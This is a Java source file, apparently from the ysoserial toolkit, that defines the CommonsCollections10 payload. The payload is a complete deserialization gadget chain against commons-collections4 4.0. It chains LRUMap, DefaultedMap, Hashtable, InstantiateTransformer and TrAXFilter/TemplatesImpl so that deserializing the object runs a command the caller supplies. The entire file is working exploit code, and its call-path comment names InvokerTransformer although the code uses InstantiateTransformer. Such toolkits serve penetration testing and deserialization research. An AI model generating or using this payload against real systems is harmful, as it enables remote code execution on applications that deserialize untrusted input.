package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Hashtable;
import java.util.Map;

/*
 <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
 <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
 <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
 <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
 <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
 <java.util.Hashtable: boolean equals(java.lang.Object)>
 <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
 <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
 <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
 */

@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CommonsCollections10 extends PayloadRunner
    implements ObjectPayload<LRUMap> {

    public LRUMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        LRUMap lruMap = new LRUMap();

        Hashtable hashtable = new Hashtable();
        hashtable.put("yy", 1);

        Hashtable wrapped = new Hashtable();
        wrapped.put("zZ", 1);
        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(wrapped, (Transformer<Integer,String>)chain);

        lruMap.put(defaultedMap, "a");
        lruMap.put(hashtable, "b");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        Reflections.setFieldValue(defaultedMap, "value", chain);

        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10.class, args);
    }
}
